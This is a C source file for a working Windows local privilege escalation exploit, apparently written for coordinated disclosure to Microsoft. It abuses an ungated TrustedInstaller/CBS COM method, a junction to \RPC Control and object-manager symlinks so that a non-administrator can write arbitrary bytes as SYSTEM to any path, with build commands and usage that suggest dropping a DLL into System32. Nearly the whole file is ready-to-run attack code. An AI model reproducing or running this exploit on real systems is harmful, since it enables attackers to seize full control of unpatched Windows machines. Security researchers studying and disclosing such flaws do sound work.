/*==============================================================================================
  TrustedInstaller / CBS "External Transformer Executor" - Local Privilege Escalation PoC
  ---------------------------------------------------------------------------------------------
  A medium-integrity, non-administrator process writes an arbitrary file, with arbitrary
  content, to an arbitrary location (e.g. C:\Windows\System32) as NT AUTHORITY\SYSTEM.

  Vulnerable surface
  ------------------
    CLSID_CbsSession  752073a1-23f2-4396-85f0-8fdb879ed0ed  ("Component Based Servicing Session")
        hosted by     C:\Windows\servicing\TrustedInstaller.exe (runs as LocalSystem)
        activatable by Interactive Users (medium IL) per the AppId's launch/access SDDL.

    Almost every ICbsSession method is gated by cbscore!EnsureCallerIsAdministrator, EXCEPT
    ICbsSession::CreateExternalTransformerExecutor (vtable slot 20). It performs no access
    check and returns the low-level CSI component-store transformer executor
    (wcp!Windows::WCP::COM::CCSIExternalTransformerExecutor). That object's Initialize() also
    has no impersonation / no admin check.

  Primitive
  ---------
    ICSIExternalTransformerExecutor::Initialize(ReferenceImage=<attacker path>) makes the
    SYSTEM worker (TiWorker.exe) LOAD an offline registry hive from
        <ReferenceImage>\System32\config\COMPONENTS
    To load a hive the kernel Configuration Manager creates its recovery LOG file next to it:
        <ReferenceImage>\System32\config\COMPONENTS.LOG1
    We redirect that SYSTEM-side file creation to an arbitrary path. The created file inherits
    the DACL of the (attacker-authored) hive, so the caller can then fill it with any content.

    See TECHNICAL_DEEPDIVE.md for the full walkthrough (what \RPC Control is, why the junction,
    which files the load produces, how the write is intercepted, etc.).

  Attack flow (this file)
  -----------------------
    [1] Build an attacker "reference image" hive with a permissive DACL           (no privilege)
    [2] Junction  <img>\System32\config  ->  \RPC Control                          (no privilege)
    [3] Object symlinks under \RPC Control:  COMPONENTS->hive, COMPONENTS.LOG1->target
    [4] Activate the CBS session and obtain the ungated transformer executor      (medium IL)
    [5] executor.Initialize(<img>)  ->  SYSTEM creates <target>
    [6] tear down the redirection; <target> is now a normal, unlocked file
    [7] open <target> and write the caller-chosen bytes                            (medium IL)
    [8] (default) clear the Hidden+System attributes the CM stamped on it

  Build (from an "x64 Native Tools Command Prompt for VS"):
      cl /nologo /W3 /O2 TrustedHive_PoC.c ole32.lib advapi32.lib /link 

  Usage (run as a normal, medium-integrity, non-administrator user):
      TrustedHive_PoC.exe <input_file> <output_path> [/keep]

  Tested: Windows 11 24H2  10.0.26100.8875  (servicing stack 26100.8872).
  This file was used for coordinated disclosure to MSRC.
==============================================================================================*/

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <objbase.h>   /* CoInitializeEx, CoCreateInstance                    */
#include <sddl.h>      /* ConvertStringSecurityDescriptorToSecurityDescriptor */
#include <aclapi.h>    /* SetNamedSecurityInfo                                 */
#include <stdio.h>

/*==============================================================================================
  Section 1 - Minimal NT definitions
  ----------------------------------
  We need three things the Win32 headers don't hand us directly:
    * OBJECT_ATTRIBUTES / UNICODE_STRING  - to create an object-manager symbolic link
    * NtCreateSymbolicLinkObject          - the syscall that creates it (resolved at runtime)
    * REPARSE_DATA_BUFFER                 - to write a mount-point (junction) reparse point
==============================================================================================*/

typedef LONG NTSTATUS;

typedef struct _UNICODE_STRING {
    USHORT Length;         /* bytes, not counting the terminating NUL */
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

#define OBJ_CASE_INSENSITIVE 0x00000040

/* ntdll!NtCreateSymbolicLinkObject - resolved with GetProcAddress (no import lib needed). */
typedef NTSTATUS (NTAPI *PFN_NtCreateSymbolicLinkObject)(
    PHANDLE LinkHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes, PUNICODE_STRING LinkTarget);
#define SYMBOLIC_LINK_ALL_ACCESS 0xF0001

/* Reparse buffer for a mount point / junction (from ntifs.h, not in the public SDK headers). */
typedef struct _REPARSE_DATA_BUFFER {
    ULONG  ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    union {
        struct { USHORT SubstituteNameOffset, SubstituteNameLength,
                        PrintNameOffset, PrintNameLength; ULONG Flags; WCHAR PathBuffer[1]; } SymbolicLink;
        struct { USHORT SubstituteNameOffset, SubstituteNameLength,
                        PrintNameOffset, PrintNameLength;              WCHAR PathBuffer[1]; } MountPoint;
        struct { UCHAR DataBuffer[1]; } Generic;
    } u;
} REPARSE_DATA_BUFFER;

#ifndef IO_REPARSE_TAG_MOUNT_POINT
#define IO_REPARSE_TAG_MOUNT_POINT 0xA0000003
#endif
#ifndef FSCTL_SET_REPARSE_POINT
#define FSCTL_SET_REPARSE_POINT 0x000900A4
#endif

/*==============================================================================================
  Section 2 - Raw COM interface shapes
  ------------------------------------
  These interfaces have registered NDR proxy/stubs, so we do NOT marshal anything ourselves:
  CoCreateInstance returns a proxy object and we simply call the correct vtable slots - the
  proxy does the cross-process marshalling to TiWorker.exe.

  For that to work the function pointers only have to sit at the right vtable INDEX. We fully
  type the two methods we actually call and leave the intervening slots as void* placeholders.

  ICbsSession10 layout:  0..2 IUnknown, 3 Initialize, 4..19 other (unused here),
                         20 CreateExternalTransformerExecutor.
  Executor  layout:      0..2 IUnknown, 3 Initialize.
==============================================================================================*/

/* CLSID_CbsSession  {752073a1-23f2-4396-85f0-8fdb879ed0ed} */
static const GUID CLSID_CbsSession  = {0x752073a1,0x23f2,0x4396,{0x85,0xf0,0x8f,0xdb,0x87,0x9e,0xd0,0xed}};
/* IID_ICbsSession10 {f112757a-565b-4260-bd05-9fa34417349a} */
static const GUID IID_ICbsSession10 = {0xf112757a,0x565b,0x4260,{0xbd,0x05,0x9f,0xa3,0x44,0x17,0x34,0x9a}};
/* IID ICSIExternalTransformerExecutor {1c8adb85-982e-47f9-999f-b0c3bf9d0449} */
static const GUID IID_IExecutor     = {0x1c8adb85,0x982e,0x47f9,{0x99,0x9f,0xb0,0xc3,0xbf,0x9d,0x04,0x49}};

typedef struct ICbsSession10 ICbsSession10;
typedef struct ICbsSession10Vtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(ICbsSession10*, REFIID, void**);      /* 0  */
    ULONG   (STDMETHODCALLTYPE *AddRef)(ICbsSession10*);                              /* 1  */
    ULONG   (STDMETHODCALLTYPE *Release)(ICbsSession10*);                             /* 2  */
    HRESULT (STDMETHODCALLTYPE *Initialize)(ICbsSession10*, int, LPCWSTR, LPCWSTR, LPCWSTR); /* 3 */
    void   *_slot4,  *_slot5,  *_slot6,  *_slot7,  *_slot8,  *_slot9;                 /* 4..9   */
    void   *_slot10, *_slot11, *_slot12, *_slot13, *_slot14, *_slot15;                /* 10..15 */
    void   *_slot16, *_slot17, *_slot18, *_slot19;                                    /* 16..19 */
    HRESULT (STDMETHODCALLTYPE *CreateExternalTransformerExecutor)(ICbsSession10*, void**); /* 20 */
} ICbsSession10Vtbl;
struct ICbsSession10 { ICbsSession10Vtbl *lpVtbl; };

typedef struct IExecutor IExecutor;
typedef struct IExecutorVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(IExecutor*, REFIID, void**);          /* 0 */
    ULONG   (STDMETHODCALLTYPE *AddRef)(IExecutor*);                                  /* 1 */
    ULONG   (STDMETHODCALLTYPE *Release)(IExecutor*);                                 /* 2 */
    /* Initialize(Flags, ReferenceVersion, ReferenceImage, FileStorage, RegStorage)  - slot 3 */
    HRESULT (STDMETHODCALLTYPE *Initialize)(IExecutor*, int, LONG, LPCWSTR, LPCWSTR, LPCWSTR);
} IExecutorVtbl;
struct IExecutor { IExecutorVtbl *lpVtbl; };

/*==============================================================================================
  Section 3 - No-privilege redirection primitives
==============================================================================================*/

static void fail(const char *what) { printf("[-] %s (GetLastError=%lu)\n", what, GetLastError()); exit(1); }

/* Create every component of a directory path (like "mkdir -p"). */
static void create_directory_tree(LPCWSTR path) {
    WCHAR tmp[MAX_PATH];
    wcscpy_s(tmp, MAX_PATH, path);
    for (WCHAR *p = tmp + 3; *p; ++p) {                /* skip the "C:\" drive prefix */
        if (*p == L'\\') { *p = 0; CreateDirectoryW(tmp, NULL); *p = L'\\'; }
    }
    CreateDirectoryW(tmp, NULL);
}

/*
 * Build a fresh, valid registry hive at 'hivePath' and give it a permissive DACL.
 *
 * RegLoadAppKey creates a brand-new "application hive" file if it doesn't exist and needs NO
 * privilege (unlike RegSaveKey, which needs SeBackupPrivilege). Any well-formed hive is enough -
 * the CSI code only has to be able to open it before it creates the .LOG file we care about.
 *
 * Why the DACL matters: when the Configuration Manager creates a hive's .LOG file it copies the
 * primary hive file's security descriptor onto the log. So the DACL we put here is the DACL the
 * SYSTEM-created target file will end up with. We grant Everyone Full so the medium-IL caller can
 * subsequently open the target for write. (SYSTEM/Administrators Full are added so the CM and
 * normal tooling keep working.)
 */
static void create_reference_hive(LPCWSTR hivePath) {
    DeleteFileW(hivePath);

    HKEY hk;
    LONG st = RegLoadAppKeyW(hivePath, &hk, KEY_ALL_ACCESS, 0, 0);
    if (st != ERROR_SUCCESS) { SetLastError(st); fail("RegLoadAppKey"); }
    RegSetValueExW(hk, L"poc", 0, REG_SZ, (const BYTE*)L"TI-EoP", sizeof(L"TI-EoP"));
    RegFlushKey(hk);
    RegCloseKey(hk);

    PSECURITY_DESCRIPTOR sd = NULL;
    if (ConvertStringSecurityDescriptorToSecurityDescriptorW(
            L"D:P(A;;FA;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)", /* protected DACL: Everyone/SYSTEM/Admins = Full */
            SDDL_REVISION_1, &sd, NULL)) {
        BOOL present = FALSE, defaulted = FALSE; PACL dacl = NULL;
        GetSecurityDescriptorDacl(sd, &present, &dacl, &defaulted);
        SetNamedSecurityInfoW((LPWSTR)hivePath, SE_FILE_OBJECT,
                              DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
                              NULL, NULL, dacl, NULL);
        LocalFree(sd);
    }
}

/*
 * Turn an (empty) directory into a junction whose target is the object-manager directory
 * "\RPC Control".  A junction is normally a filesystem->filesystem reparse point, but the
 * substitute name can be any NT object path; pointing it at "\RPC Control" means a lookup of
 *     <dir>\NAME
 * is resolved by the object manager as
 *     \RPC Control\NAME
 * i.e. through whatever object-manager symbolic link we place there (see create_object_symlink).
 * This gives us per-file redirection without needing SeCreateSymbolicLinkPrivilege.
 */
static void junction_to_rpc_control(LPCWSTR directory) {
    static const WCHAR kTarget[] = L"\\RPC Control";
    const USHORT subBytes  = (USHORT)(wcslen(kTarget) * sizeof(WCHAR));
    /* PathBuffer = SubstituteName + L'\0' + (empty PrintName) + L'\0' */
    const USHORT pathBytes = subBytes + sizeof(WCHAR) + sizeof(WCHAR);
    const DWORD  total = FIELD_OFFSET(REPARSE_DATA_BUFFER, u.MountPoint.PathBuffer) + pathBytes;

    REPARSE_DATA_BUFFER *rb = (REPARSE_DATA_BUFFER*)calloc(1, total);
    rb->ReparseTag                     = IO_REPARSE_TAG_MOUNT_POINT;
    rb->ReparseDataLength              = (USHORT)(FIELD_OFFSET(REPARSE_DATA_BUFFER, u.MountPoint.PathBuffer)
                                                  - FIELD_OFFSET(REPARSE_DATA_BUFFER, u.MountPoint) + pathBytes);
    rb->u.MountPoint.SubstituteNameOffset = 0;
    rb->u.MountPoint.SubstituteNameLength = subBytes;
    rb->u.MountPoint.PrintNameOffset      = subBytes + sizeof(WCHAR);
    rb->u.MountPoint.PrintNameLength      = 0;
    memcpy(rb->u.MountPoint.PathBuffer, kTarget, subBytes);   /* trailing NULs already zeroed */

    /* The directory must exist and be empty; open it as a reparse point to set the tag on it. */
    HANDLE h = CreateFileW(directory, GENERIC_WRITE,
                           FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL,
                           OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
    if (h == INVALID_HANDLE_VALUE) fail("open config directory for junction");

    DWORD returned = 0;
    if (!DeviceIoControl(h, FSCTL_SET_REPARSE_POINT, rb, total, NULL, 0, &returned, NULL))
        fail("FSCTL_SET_REPARSE_POINT (\\RPC Control junction)");
    CloseHandle(h);
    free(rb);
}

/*
 * Create an object-manager symbolic link  "\RPC Control\<linkName>" -> "<targetNtPath>".
 *
 * Object-manager symlinks under \RPC Control need no privilege (SeCreateSymbolicLinkPrivilege
 * only governs *filesystem* symlinks). They are temporary objects, though: they vanish when the
 * last handle closes. We therefore keep the handle open until the exploit has fired - the caller
 * stores the returned handle and closes it afterwards.
 */
static HANDLE create_object_symlink(PFN_NtCreateSymbolicLinkObject NtCreateSymbolicLinkObject,
                                    LPCWSTR linkName, LPCWSTR targetNtPath) {
    UNICODE_STRING name, target;
    name.Buffer   = (PWSTR)linkName;      name.Length   = (USHORT)(wcslen(linkName) * sizeof(WCHAR));   name.MaximumLength   = name.Length + sizeof(WCHAR);
    target.Buffer = (PWSTR)targetNtPath;  target.Length = (USHORT)(wcslen(targetNtPath) * sizeof(WCHAR)); target.MaximumLength = target.Length + sizeof(WCHAR);

    OBJECT_ATTRIBUTES oa; memset(&oa, 0, sizeof(oa));
    oa.Length = sizeof(oa);
    oa.ObjectName = &name;
    oa.Attributes = OBJ_CASE_INSENSITIVE;

    HANDLE h = NULL;
    NTSTATUS st = NtCreateSymbolicLinkObject(&h, SYMBOLIC_LINK_ALL_ACCESS, &oa, &target);
    if (st != 0) { printf("[-] NtCreateSymbolicLinkObject(%ws) status=0x%08lx\n", linkName, (ULONG)st); exit(1); }
    return h;
}

/*==============================================================================================
  Section 4 - main / the exploit
==============================================================================================*/
int wmain(int argc, wchar_t **argv) {
    printf("==============================================================================\n"
           "                     ~ TrustedHive PoC by dis0rder0x00 ~\n"
           "TrustedInstaller CBS 'External Transformer Executor' -> arbitrary SYSTEM write\n"
           "==============================================================================\n");

    /* -------- parse arguments:  <input_file> <output_path> [/keep] ------------------------- */
    int keepHiddenSystem = 0;
    const wchar_t *positional[2]; int nPositional = 0;
    for (int i = 1; i < argc; ++i) {
        if (!_wcsicmp(argv[i], L"/keep") || !_wcsicmp(argv[i], L"-keep") ||
            !_wcsicmp(argv[i], L"--keep-attributes") || !_wcsicmp(argv[i], L"/k")) {
            keepHiddenSystem = 1;
        } else if (nPositional < 2) {
            positional[nPositional++] = argv[i];
        }
    }
    if (nPositional != 2) {
        printf("usage: %ws <input_file> <output_path> [/keep]\n"
               "  <input_file>  : file whose bytes are written to the target\n"
               "  <output_path> : destination (its parent directory must exist),\n"
               "                  e.g. C:\\Windows\\System32\\poc.dll\n"
               "  /keep         : keep the Hidden+System attributes the Configuration Manager\n"
               "                  stamps on the created hive-log file (default: clear them).\n", argv[0]);
        return 1;
    }

    WCHAR inputPath[MAX_PATH], outputPath[MAX_PATH];
    if (!GetFullPathNameW(positional[0], MAX_PATH, inputPath, NULL))  fail("resolve input path");
    if (!GetFullPathNameW(positional[1], MAX_PATH, outputPath, NULL)) fail("resolve output path");

    /* read the payload the caller wants placed at outputPath */
    HANDLE hIn = CreateFileW(inputPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hIn == INVALID_HANDLE_VALUE) { printf("[-] cannot open input file: %ws\n", inputPath); return 1; }
    DWORD payloadSize = GetFileSize(hIn, NULL), readBytes = 0;
    BYTE *payload = (BYTE*)malloc(payloadSize ? payloadSize : 1);
    ReadFile(hIn, payload, payloadSize, &readBytes, NULL);
    CloseHandle(hIn);

    PFN_NtCreateSymbolicLinkObject NtCreateSymbolicLinkObject =
        (PFN_NtCreateSymbolicLinkObject)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateSymbolicLinkObject");
    if (!NtCreateSymbolicLinkObject) fail("resolve ntdll!NtCreateSymbolicLinkObject");

    /* working layout under %TEMP%:
         <work>\img\System32\config     <- becomes the junction to \RPC Control
         <work>\hive\COMPONENTS         <- the real attacker hive the symlink points at         */
    WCHAR temp[MAX_PATH], work[MAX_PATH], img[MAX_PATH], configDir[MAX_PATH], hiveDir[MAX_PATH], hive[MAX_PATH];
    GetTempPathW(MAX_PATH, temp);
    swprintf_s(work,      MAX_PATH, L"%sti_eop_%lu", temp, GetCurrentProcessId());
    swprintf_s(img,       MAX_PATH, L"%s\\img", work);
    swprintf_s(configDir, MAX_PATH, L"%s\\img\\System32\\config", work);
    swprintf_s(hiveDir,   MAX_PATH, L"%s\\hive", work);
    swprintf_s(hive,      MAX_PATH, L"%s\\hive\\COMPONENTS", work);
    create_directory_tree(configDir);
    create_directory_tree(hiveDir);

    /* ---- [1] attacker reference-image hive -------------------------------------------------- */
    printf("[1] Building attacker reference-image hive (RegLoadAppKey, no privilege)\n");
    create_reference_hive(hive);

    /* ---- [2] junction  <img>\System32\config -> \RPC Control ------------------------------- */
    printf("[2] Junction  <img>\\System32\\config  ->  \\RPC Control  (no privilege)\n");
    junction_to_rpc_control(configDir);

    /* ---- [3] object-manager symlinks under \RPC Control ------------------------------------ *
     *  The Configuration Manager will look up, relative to <img>\System32\config:
     *      COMPONENTS       (the hive to load)   -> we point it at our real hive
     *      COMPONENTS.LOG1  (the recovery log)   -> we point it at the attacker's chosen target
     *  We deliberately do NOT provide COMPONENTS.LOG2. After the CM creates LOG1 (our target) it
     *  tries to create LOG2 inside \RPC Control, which fails, so the hive load aborts - leaving
     *  our target as a normal, UNLOCKED file. (If LOG2 succeeded the load would complete, the
     *  hive would stay mounted, and the target would remain exclusively locked - and a medium-IL
     *  user cannot unload a hive.)                                                              */
    printf("[3] Object symlinks: COMPONENTS -> hive, COMPONENTS.LOG1 -> target  (no privilege)\n");
    WCHAR ntHive[MAX_PATH + 8], ntTarget[MAX_PATH + 8];
    swprintf_s(ntHive,   MAX_PATH + 8, L"\\??\\%s", hive);        /* \??\ = the Win32 drive namespace */
    swprintf_s(ntTarget, MAX_PATH + 8, L"\\??\\%s", outputPath);
    HANDLE links[2];
    links[0] = create_object_symlink(NtCreateSymbolicLinkObject, L"\\RPC Control\\COMPONENTS",      ntHive);
    links[1] = create_object_symlink(NtCreateSymbolicLinkObject, L"\\RPC Control\\COMPONENTS.LOG1", ntTarget);
    printf("      COMPONENTS      -> %ws\n", hive);
    printf("      COMPONENTS.LOG1 -> %ws\n", outputPath);

    /* ---- [4] obtain the ungated transformer executor (medium IL) --------------------------- */
    printf("[4] Activating CBS session (SYSTEM) and obtaining the ungated transformer executor\n");
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    ICbsSession10 *session = NULL;
    HRESULT hr = CoCreateInstance(&CLSID_CbsSession, NULL, CLSCTX_LOCAL_SERVER, &IID_ICbsSession10, (void**)&session);
    if (FAILED(hr) || !session) { printf("[-] CoCreateInstance(CbsSession) hr=0x%08lx\n", hr); return 1; }
    session->lpVtbl->Initialize(session, 0, L"MSRC-PoC", NULL, NULL);

    IUnknown *executorUnk = NULL;
    hr = session->lpVtbl->CreateExternalTransformerExecutor(session, (void**)&executorUnk);   /* <-- ungated */
    if (FAILED(hr) || !executorUnk) { printf("[-] CreateExternalTransformerExecutor hr=0x%08lx (patched?)\n", hr); return 1; }

    IExecutor *executor = NULL;
    executorUnk->lpVtbl->QueryInterface(executorUnk, &IID_IExecutor, (void**)&executor);

    /* ---- [5] trigger the SYSTEM-side hive load / file creation ----------------------------- */
    printf("[5] executor.Initialize(ReferenceImage=<img>) -> SYSTEM creates the target file\n");
    hr = executor->lpVtbl->Initialize(executor, 0, 0, img, NULL, NULL);
    printf("      (executor returned 0x%08lx - expected; the load aborts after LOG1 is created)\n", hr);

    /* ---- [6] tear down the redirection so the target is a plain unlocked file --------------- */
    CloseHandle(links[0]); CloseHandle(links[1]);         /* drop the object symlinks           */
    executor->lpVtbl->Release(executor);
    executorUnk->lpVtbl->Release(executorUnk);
    session->lpVtbl->Release(session);
    Sleep(500);

    if (GetFileAttributesW(outputPath) == INVALID_FILE_ATTRIBUTES) {
        printf("[-] FAILED: SYSTEM did not create the target (surface may be patched)\n");
        return 1;
    }
    printf("[6] SYSTEM created: %ws\n", outputPath);

    /* ---- [7] write the caller-chosen bytes ------------------------------------------------- *
     *  The target's DACL was copied from our hive (Everyone:Full), so this medium-IL process can
     *  now open it for write. A short retry loop tolerates the brief window while the aborted
     *  hive load is torn down and the file's lock is released.                                  */
    printf("[7] Writing input file contents into the SYSTEM-created file (medium-IL user)\n");
    HANDLE hOut = INVALID_HANDLE_VALUE;
    for (int attempt = 0; attempt < 40; ++attempt) {
        hOut = CreateFileW(outputPath, GENERIC_WRITE,
                           FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
        if (hOut != INVALID_HANDLE_VALUE) break;
        Sleep(250);
    }
    if (hOut == INVALID_HANDLE_VALUE) fail("open target for write");
    SetFilePointer(hOut, 0, NULL, FILE_BEGIN);
    DWORD written = 0;
    WriteFile(hOut, payload, readBytes, &written, NULL);
    SetEndOfFile(hOut);
    CloseHandle(hOut);

    /* ---- [8] normalise attributes (unless /keep) ------------------------------------------ *
     *  SYSTEM created the file *as a registry hive log*, so the CM stamped it Hidden+System
     *  (like config\SOFTWARE.LOG1). A plain 'dir' would then say "File Not Found". Clear them so
     *  the result is an ordinary, visible file. We have the right to do so via the Everyone:Full
     *  DACL. Pass /keep to leave them.                                                          */
    if (!keepHiddenSystem) {
        DWORD attrs = GetFileAttributesW(outputPath);
        if (attrs != INVALID_FILE_ATTRIBUTES) {
            attrs &= ~(FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
            if (attrs == 0) attrs = FILE_ATTRIBUTE_NORMAL;
            SetFileAttributesW(outputPath, attrs);
        }
        printf("[8] Cleared Hidden/System attributes (ordinary file; pass /keep to preserve)\n");
    } else {
        printf("[8] Kept Hidden/System attributes (as stamped by the Configuration Manager)\n");
    }

    /* ---- best-effort cleanup of the temp working directory --------------------------------- */
    RemoveDirectoryW(configDir);      /* drop the junction first so we don't recurse into \RPC Control */
    {
        WCHAR cmd[MAX_PATH + 32];
        swprintf_s(cmd, MAX_PATH + 32, L"cmd.exe /c rd /s /q \"%s\"", work);
        STARTUPINFOW si = { sizeof(si) }; PROCESS_INFORMATION pi = {0};
        if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 3000); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        }
    }

    printf("\n[+] SUCCESS  ->  %ws\n"
           "[+] %lu bytes of '%ws' written to a location a medium-IL user cannot create in.\n"
           "[+] Owner: NT AUTHORITY\\SYSTEM.  Arbitrary file write as SYSTEM from a medium-integrity, non-administrator process.\n", outputPath, written, inputPath);

    free(payload);
    CoUninitialize();
    return 0;
}
